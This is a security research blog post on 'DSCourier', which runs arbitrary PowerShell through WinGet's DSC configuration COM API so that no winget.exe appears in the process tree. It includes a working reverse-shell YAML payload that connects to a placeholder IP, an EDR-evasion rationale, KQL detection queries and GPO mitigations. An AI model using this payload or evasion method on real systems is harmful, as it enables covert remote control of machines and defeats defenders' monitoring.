@@ -1,0 +1,211 @@
+# https://eclipsesec.com/posts/DSCourier/
+
+<!DOCTYPE html><html lang="en">
+  <body>
+    
+
+    <main class="container">
+      <div class="post-container">
+        
+
+        <article class="post-article">
+          <p>The abuse of Windows Package Manager (WinGet) as a living-off-the-land binary is not a new concept. Prior research, such as <a href="https://www.zerosalarium.com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html" target="_blank" rel="noreferrer">Zero Salarium's work</a> in December 2024, demonstrated that <code>winget.exe</code> can serve as a proxy for PowerShell execution through its <code>configure</code> subcommand.</p>
+
+          <p>This post takes that concept further. Instead of calling <code>winget.exe</code>, we invoke the WinGet Configuration engine directly through its <strong>COM API</strong>, completely removing the CLI process from the execution chain. The result is arbitrary code execution inside a Microsoft-signed process with no <code>winget.exe</code>, no <code>powershell.exe</code>, and no <code>cmd.exe</code> in the process tree.</p>
+
+          <section>
+            <h2>Requirements</h2>
+            <p>Before getting into the specifics, for this to work for both the classic configure method and our COM approach, a few things are needed on the target machine:</p>
+            <ol>
+              <li>Windows 10 version 1809 (build 17763) or later, Windows 11, or Windows Server 2025.</li>
+              <li>WinGet (shouldn't be a surprise), but specifically version v1.6.2631 or later. This is needed for configuration support.</li>
+              <li>WinGet's full package (not just the stub package). By default, WinGet installs as a small stub. Running <code style="text-decoration:underline;">winget configure --enable</code> downloads the full package with configuration support.</li>
+            </ol>
+          </section>
+
+          <section>
+            <h2>What is WinGet?</h2>
+            <p><a href="https://learn.microsoft.com/en-us/windows/package-manager/winget/" target="_blank" rel="noreferrer">WinGet</a> is Microsoft's official package manager for Windows. Think of apt on Debian or brew on MacOS, it lets you search for, install, update, and remove software directly from the terminal without navigating download pages or running a GUI installer.</p>
+            <p>What makes WinGet relevant here is its availability. It ships natively with modern versions of Windows 10, 11 and Windows Server 2025, making it a candidate for living-off-the-land abuse. Many administrators know it for installing software, but WinGet also includes a <strong>configure</strong> subcommand that can apply machine configurations from YAML files (including executing PowerShell). That capability is where things get a bit interesting.</p>
+          </section>
+
+          <section>
+            <h2>WinGet as a PowerShell Execution Proxy</h2>
+            <p>WinGet's configure command accepts YAML files that define DSC resources. Among the available resources, <strong>PSDscResources/Script</strong> allows arbitrary PowerShell execution. The PowerShell in this case does not run through <code>powershell.exe</code> or <code>pwsh.exe</code>, but instead runs through <strong>ConfigurationRemotingServer.exe</strong>, which is a Microsoft-signed binary in the WinGet package directory. This can alone make WinGet a proxy for PowerShell execution that can potentially bypass monitoring focused on traditional PowerShell host processes.</p>
+          </section>
+
+          <section>
+            <h2>The Limitations of Using winget.exe Directly</h2>
+            <p>Although WinGet can execute PowerShell through a trusted process, using <code>winget configure</code> directly has several drawbacks from an offensive perspective.</p>
+            <p><strong>Process creation logging exposes the entry point:</strong> <code>winget.exe</code> appears in process creation logs with its full command line, including the path to the YAML configuration file. Whether the configuration was fetched from a remote URL or loaded from disk, the full path or URL is logged in the command line arguments (shown below in process.command_line). A defender can make a simple KQL query for WinGet configure executions and immediately identify what was applied and where it came from:</p>
+            <pre><code>process.name: "winget.exe" and process.command_line: (*configure* or *configuration* or *dsc*)</code></pre>
+            <p><img src="https://eclipsesec.com/img/DSCourier1.png" alt="EDR log showing winget.exe process creation with full command line visible" style="max-width:100%;border-radius:8px;display:block;margin:16px 0;"></p>
+            <p><strong>Parent-child process relationships provide forensic context:</strong> When <code>winget configure</code> is invoked from a shell, <code>cmd.exe</code> or <code>powershell.exe</code> appears as the parent of <code>winget.exe</code> in the process tree. While this can be legitimate (a system administrator running a configuration manually), it gives defenders a full chain to investigate. They can see who initiated the command, from which terminal session, and what YAML file was referenced. The point here isn't that the process chain is inherently malicious, but that it's fully observable and traceable back to the source.</p>
+            <p>So while downstream execution inside <code>ConfigurationRemotingServer.exe</code> has detection blind spots, the initiation point through <code>winget.exe</code> is entirely visible to any organization with basic process monitoring.</p>
+          </section>
+
+          <section>
+            <h2>Building YAML Payloads</h2>
+            <p>Before discussing how we eliminate <code>winget.exe</code>, it's worth understanding what a weaponized YAML configuration looks like. WinGet DSC configs follow the <a href="https://aka.ms/configuration-dsc-schema/0.2" target="_blank" rel="noreferrer">DSC v0.2 schema</a> and can include multiple resources that execute sequentially.</p>
+            <p>For example purposes, here is an extremely simplified configuration file that establishes a reverse shell.</p>
+            <pre><code>properties:
+  configurationVersion: 0.2.0
+  resources:
+    - resource: PSDscResources/Script
+      id: env-health-check
+      directives:
+        description: Simple Reverse Shell Example
+        allowPrerelease: true
+      settings:
+        GetScript: |
+          @{ Result = "OK" }
+        SetScript: |
+          $client = [System.Net.Sockets.TcpClient]::new()
+          $client.Connect('IP_ADDRESS', 443)
+          $stream = $client.GetStream()
+          $writer = [System.IO.StreamWriter]::new($stream)
+          $reader = [System.IO.StreamReader]::new($stream)
+          $writer.AutoFlush = $true
+          $writer.WriteLine("[+] Shell from $env:COMPUTERNAME as $env:USERNAME via ConfigurationRemotingServer")
+          while ($true) {
+              $writer.Write('DSC&gt; ')
+              $cmd = $reader.ReadLine()
+              if ($cmd -eq 'exit') { break }
+              try {
+                  $output = Invoke-Expression $cmd 2&gt;&amp;1 | Out-String
+                  $writer.WriteLine($output)
+              } catch {
+                  $writer.WriteLine($_.Exception.Message)
+              }
+          }
+          $client.Close()
+        TestScript: |
+          $false</code></pre>
+            <dl class="def-list">
+              <div class="def-item">
+                <dt><code>configurationVersion</code></dt>
+                <dd>Specifies which version of the DSC configuration format is being used, with 0.2.0 being the current standard.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>resource</code></dt>
+                <dd>Specifies which DSC resource module and type to use. The format is <code>ModuleName/ResourceType</code>. So in this case <code>PSDscResources</code> is our ModuleType and <code>Script</code> is the Resource Type that allows arbitrary PowerShell.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>id</code></dt>
+                <dd>An arbitrary label for the resource. This can be anything we want as it has no functional impact.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>allowPrerelease</code></dt>
+                <dd>Allows WinGet to use pre-release (preview/beta) versions of packages or resources if it needs to install them.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>GetScript</code></dt>
+                <dd>PowerShell that returns the current state. DSC calls this to check what the current configuration looks like. For our purpose we use a placeholder like <code>@{ Result = "OK" }</code>.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>SetScript</code></dt>
+                <dd>The PowerShell that actually executes when the configuration is applied. Whatever code is here runs inside <code>ConfigurationRemotingServer.exe</code>.</dd>
+              </div>
+              <div class="def-item">
+                <dt><code>TestScript</code></dt>
+                <dd>PowerShell that simply returns <code>$true</code> or <code>$false</code>. DSC calls this first to check if the desired state is already met. If <code>$true</code>, the SetScript is skipped. Returning <code>$false</code> however forces SetScript to execute every time.</dd>
+              </div>
+            </dl>
+          </section>
+
+          <section>
+            <h2>Removing winget.exe from the Equation</h2>
+            <p>Most existing detection guidance for WinGet abuse focuses on monitoring <code>winget.exe</code> process creation. But what if <code>winget.exe</code> never runs?</p>
+            <p>WinGet exposes its configuration functionality through a <strong>WinRT (Windows Runtime) COM API</strong> in the <code>Microsoft.Management.Configuration</code> namespace. This API is registered in the AppX manifest of the <code>Microsoft.DesktopAppInstaller</code> package and is accessible to any process on the system through standard COM activation. The key COM servers are:</p>
+            <ul>
+              <li>PackageManager Class (WindowsPackageManagerServer)</li>
+              <li>ConfigurationStaticFunctions (The DSC configuration engine)</li>
+            </ul>
+            <p>Both activate without administrative privileges and both spawn <code>WindowsPackageManagerServer.exe</code> (a Microsoft-signed binary) as the COM server host. No additional software installation is required as these are present on any system with WinGet installed.</p>
+          </section>
+
+          <section>
+            <h2>How the COM API Technique Works</h2>
+            <p>WinGet ships two Windows Metadata (.winmd) files, <code>Microsoft.Management.Configuration.winmd</code> and <code>Microsoft.Management.Deployment.winmd</code>, which describe the COM/WinRT interfaces its client and configuration engine expose to out-of-process callers. By building a .NET interop layer against these metadata files, a custom application can directly invoke the configuration engine. The call chain is:</p>
+            <ol>
+              <li><code>CoCreateInstance</code> activates <code>ConfigurationStaticFunctions</code></li>
+              <li><code>CreateConfigurationSetProcessorFactoryAsync("pwsh")</code> creates the PowerShell DSC processor</li>
+              <li><code>CreateConfigurationProcessor(factory)</code> creates the configuration processor</li>
+              <li><code>OpenConfigurationSet(yamlStream)</code> parses the YAML into a configuration set</li>
+              <li><code>ApplySet(configSet, flags)</code> applies the configuration</li>
+            </ol>
+            <p>The DSC engine spawns <code>ConfigurationRemotingServer.exe</code> to execute resources, but the entry point is no longer <code>winget.exe</code>. The calling application makes COM calls to Microsoft-signed WinRT services.</p>
+          </section>
+
+          <section>
+            <h2>The Interop Layer</h2>
+            <p>Accessing the WinGet Configuration COM API from .NET requires an interop layer that projects the WinRT types into managed code. We built this by extending <a href="https://github.com/marticliment/WinGet-API-from-CSharp" target="_blank" rel="noreferrer">marticliment's WinGet-API-from-CSharp</a> project, which provides COM interop for WinGet's package management API. We added Configuration API support by:</p>
+            <ol>
+              <li>Adding <code>Microsoft.Management.Configuration</code> to the CsWinRT projections</li>
+              <li>Registering the <code>ConfigurationStaticFunctions</code></li>
+              <li>Adding a method to create <code>ConfigurationStaticFunctions</code> instances</li>
+            </ol>
+            <p>The result is a set of DLLs that allow any .NET application to invoke the WinGet Configuration API through COM. All of the supporting files are legitimate Microsoft components. Only our executable <code>DSCourier.exe</code> is custom.</p>
+          </section>
+
+          <section>
+            <h2>What the Process Tree Looks Like</h2>
+            <p><strong>Traditional winget.exe Approach:</strong></p>
+            <pre class="process-tree"><code>cmd.exe
+ └── winget.exe (configure -f payload.yaml)
+       └── ConfigurationRemotingServer.exe [Microsoft-signed]</code></pre>
+            <p><strong>DSCourier COM API Approach:</strong></p>
+            <pre class="process-tree"><code>svchost.exe (DCOMLaunch)
+ └── WindowsPackageManagerServer.exe    [Microsoft-signed]
+       └── ConfigurationRemotingServer.exe    [Microsoft-signed]</code></pre>
+            <p>The process tree of the latter matches what legitimate WinGet COM consumers produce, all while producing no <code>winget.exe</code>.</p>
+            <p><img src="https://eclipsesec.com/img/DSCourier2.png" alt="EDR process tree showing DSCourier COM approach with only Microsoft-signed binaries" style="max-width:100%;border-radius:8px;display:block;margin:16px 0;"></p>
+          </section>
+
+          <section>
+            <h2>Detections</h2>
+            <p>Defenders should be on the lookout for <code>WindowsPackageManagerServer.exe</code> and <code>ConfigurationRemotingServer.exe</code>.</p>
+            <p>Shells spawned by DSC execution components are the strongest single indicator. <code>ConfigurationRemotingServer.exe</code> persists even on the COM-only path, and legitimate use doesn't spawn interactive shells:</p>
+            <pre><code>event.category:process and event.type:start and
+process.parent.name:("ConfigurationRemotingServer.exe" or "WindowsPackageManagerServer.exe") and
+process.name:("powershell.exe" or "pwsh.exe" or "cmd.exe" or "wscript.exe" or "cscript.exe" or "conhost.exe")</code></pre>
+            <p><img src="https://eclipsesec.com/img/DSCourier3.png" alt="EDR logs showing conhost.exe spawned as a child of ConfigurationRemotingServer.exe" style="max-width:100%;border-radius:8px;display:block;margin:16px 0;"></p>
+            <p class="img-caption">Note: These logs were generated from running shell commands from the above reverse shell YAML resource. <code>conhost.exe</code> is attached by Windows whenever a console application is launched, so seeing it as a child of <code>ConfigurationRemotingServer.exe</code> is itself an indicator that a shell was spawned during DSC execution.</p>
+          </section>
+
+          <section>
+            <h2>Preventions</h2>
+            <p>Disable WinGet entirely: Setting 'Enable App Installer' to Disabled blocks all functional WinGet operations.</p>
+            <ul>
+              <li>GPO: <code>Computer Configuration → Administrative Templates → Windows Components → Desktop App Installer → Enable App Installer</code> → Set to Disabled.</li>
+            </ul>
+            <p>Disable WinGet configuration: This disables <code>winget configure</code> and the underlying COM configuration interfaces while leaving package installation intact.</p>
+            <ul>
+              <li>GPO: <code>Computer Configuration → Administrative Templates → Windows Components → Desktop App Installer → Enable Windows Package Manager Configuration</code> → Set to Disabled.</li>
+            </ul>
+            <p>Constrained Language Mode (CLM), WDAC, AppLocker, etc.</p>
+          </section>
+
+          <section>
+            <h2>Conclusion</h2>
+            <p>By invoking the DSC engine through COM rather than the CLI, we are able to execute arbitrary code inside of a Microsoft-signed process with no <code>winget.exe</code> artifacts.</p>
+            <p>One of the key takeaways is that this demonstrates that detection strategies focused solely on <code>winget.exe</code> are insufficient. Defenders must also shift visibility toward the behavior of <code>WindowsPackageManagerServer.exe</code> and <code>ConfigurationRemotingServer.exe</code>. Ultimately, this technique highlights how trusted Windows management components can be used in ways that blend in with legitimate system activity.</p>
+          </section>
+
+          <section>
+            <h2>Source Code</h2>
+            <p>DSCourier is available on GitHub: <a href="https://github.com/DylanDavis1/DSCourier" target="_blank" rel="noreferrer">github.com/DylanDavis1/DSCourier</a></p>
+            <p>The repository includes pre-built binaries in the Releases tab, YAML configuration for testing, and a build script for building from source.</p>
+          </section>
+
+          <p class="post-back"><a href="https://eclipsesec.com/">← Back to Blog</a></p>
+        </article>
+      </div>
+    </main>
+
+    
+
+    
+  
+
+</body></html>
